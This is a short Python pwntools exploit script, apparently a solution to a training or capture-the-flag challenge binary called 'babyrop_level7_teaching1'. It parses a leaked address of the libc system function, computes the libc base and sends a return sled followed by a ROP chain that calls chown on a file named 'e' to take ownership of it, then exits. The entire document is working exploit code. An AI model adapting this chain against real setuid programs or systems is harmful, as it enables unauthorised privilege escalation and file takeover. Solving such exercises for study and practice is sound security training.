#!/usr/bin/python3
from pwn import *
context.clear(arch='amd64')
context.binary = 'babyrop_level7_teaching1'
e = ELF('./babyrop_level7_teaching1')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
r = ROP(libc)
#p = gdb.debug(['./babyrop_level7_teaching1'])
p = process('./babyrop_level7_teaching1')
p.recvuntil(b'is: ')
x = int(p.recvline().strip()[:-1], 16)
log.info('System is @ '+hex(x))
libc.address = x - libc.sym['system']
getGadget = lambda x: p64(r.find_gadget(x).address+libc.address)
ret = getGadget(['ret'])
# p64(r2.find_gadget(['pop rdi', 'ret']).address)
exploit = getGadget(['pop rdi', 'ret'])
exploit += p64(next(e.search(b"e\x00")))
exploit += getGadget(['pop rsi', 'ret'])
exploit += p64(1000)
exploit += getGadget(['pop rdx', 'pop rbx', 'ret'])
exploit += p64(1000)
exploit += p64(0)
exploit += p64(libc.sym["chown"])
exploit += p64(libc.sym["exit"])
p.send((104*ret)+exploit)
p.interactive()